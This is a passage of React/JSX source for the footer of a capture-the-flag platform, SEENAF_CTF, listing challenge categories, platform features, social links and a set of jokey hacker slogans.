        <div className="max-w-6xl mx-auto">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
            <div>
              <div className="flex items-center gap-3 mb-4">
                <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center">
                  <Terminal className="h-6 w-6 text-primary" />
                </div>
                <span className="font-mono text-xl font-bold text-primary">SEENAF_CTF</span>
              </div>
              <p className="text-muted-foreground text-sm leading-relaxed mb-4">
                The premier cybersecurity challenge platform for elite hackers and security professionals.
              </p>
              <div className="flex items-center gap-3">
                {socialLinks.slice(0, 3).map((social) => {
                  const Icon = social.icon;
                  return (
                    <a
                      key={social.name}
                      href={social.url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className={`w-8 h-8 rounded-lg bg-secondary/50 flex items-center justify-center transition-colors duration-300 ${social.color}`}
                    >
                      <Icon className="h-4 w-4" />
                    </a>
                  );
                })}
              </div>
            </div>
            
            <div>
              <h4 className="font-mono font-semibold mb-4 text-primary">Categories</h4>
              <ul className="space-y-2 text-sm text-muted-foreground">
                <li className="hover:text-primary transition-colors cursor-pointer">Web Security (7)</li>
                <li className="hover:text-primary transition-colors cursor-pointer">Cryptography (7)</li>
                <li className="hover:text-primary transition-colors cursor-pointer">Digital Forensics (12)</li>
                <li className="hover:text-primary transition-colors cursor-pointer">Reverse Engineering (6)</li>
                <li className="hover:text-primary transition-colors cursor-pointer">Binary Exploitation (3)</li>
                <li className="hover:text-primary transition-colors cursor-pointer">Network Analysis (6)</li>
                <li className="hover:text-primary transition-colors cursor-pointer">Steganography (4)</li>
                <li className="hover:text-primary transition-colors cursor-pointer">OSINT (3)</li>
                <li className="hover:text-primary transition-colors cursor-pointer">Miscellaneous (4)</li>
              </ul>
            </div>
            
            <div>
              <h4 className="font-mono font-semibold mb-4 text-primary">Platform</h4>
              <ul className="space-y-2 text-sm text-muted-foreground">
                <li className="hover:text-primary transition-colors cursor-pointer">Live Leaderboard</li>
                <li className="hover:text-primary transition-colors cursor-pointer">Real-time Scoring</li>
                <li className="hover:text-primary transition-colors cursor-pointer">Challenge Hints</li>
                <li className="hover:text-primary transition-colors cursor-pointer">Progress Tracking</li>
              </ul>
            </div>

            <div>
              <h4 className="font-mono font-semibold mb-4 text-primary">Community</h4>
              <ul className="space-y-2 text-sm text-muted-foreground">
                {socialLinks.map((social) => (
                  <li key={social.name}>
                    <a
                      href={social.url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="hover:text-primary transition-colors cursor-pointer flex items-center gap-2"
                    >
                      <social.icon className="h-3 w-3" />
                      {social.description}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
          </div>

          {/* Hacker Slogans Section */}
          <div className="py-8 border-t border-border/30 border-b border-border/30">
            <div className="text-center mb-6">
              <h4 className="font-mono font-semibold text-primary mb-4">// HACKER_MANTRAS</h4>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {[
                  "Code is poetry. Exploits are art.",
                  "In root we trust.",
                  "There is no patch for human stupidity.",
                  "Access denied? Challenge accepted.",
                  "Sleep is for those without root access.",
                  "Hack first, ask questions later."
                ].map((slogan, index) => (
                  <motion.div
                    key={index}
                    initial={{ opacity: 0, y: 10 }}
                    whileInView={{ opacity: 1, y: 0 }}
                    viewport={{ once: true }}
                    transition={{ delay: index * 0.1 }}
                    className="p-3 rounded-lg bg-secondary/20 border border-border/30"
                  >
                    <p className="text-xs font-mono text-muted-foreground italic">
                      "{slogan}"
                    </p>
                  </motion.div>
                ))}
              </div>
            </div>
          </div>
          
          <div className="pt-8 flex flex-col md:flex-row items-center justify-between">
            <div className="flex flex-col md:flex-row items-center gap-4 mb-4 md:mb-0">
              <p className="text-xs text-muted-foreground font-mono">
                © 2025 SEENAF_CTF. All rights reserved.
              </p>
              <div className="flex items-center gap-4 text-xs text-muted-foreground font-mono">
                <span>Made with 💚 by hackers, for hackers</span>
              </div>
            </div>
            <div className="flex flex-col items-center md:items-end">
              <p className="text-xs text-muted-foreground font-mono mb-1">
                {'// Hack the planet, secure the future'}
              </p>
              <p className="text-xs text-primary/60 font-mono">
                {'> System.exit(0);'}
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
